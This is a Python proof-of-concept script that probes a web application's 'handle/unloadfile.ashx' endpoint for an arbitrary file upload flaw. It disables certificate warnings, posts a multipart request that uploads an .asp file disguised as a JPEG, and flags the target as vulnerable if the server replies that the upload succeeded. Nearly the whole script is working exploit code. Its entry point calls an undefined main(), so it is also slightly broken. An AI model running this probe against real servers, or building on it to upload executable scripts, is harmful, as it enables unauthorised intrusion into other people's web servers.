import requests,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(urls):
    # try:
        if urls[-1]=='/':
            url = urls + "handle/unloadfile.ashx"
        else:
            url = urls + "/handle/unloadfile.ashx"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'multipart/form-data; boundary=---------------------------21909179191068471382830692394',
            'Connection': 'close',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        body='''
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="file"; filename="test.asp"\r
Content-Type: image/jpeg\r
\r
test\r
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="action"\r
\r
unloadfile\r
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="filepath"\r
\r
./\r
-----------------------------21909179191068471382830692394\r
'''
        r=requests.post(url=url,data=body,headers=headers)
        if '成功上传' in r.text :
            return True
        else :
            return False
    # except:
    #     flag=0
    #     return flag
if __name__ == '__main__':
    main()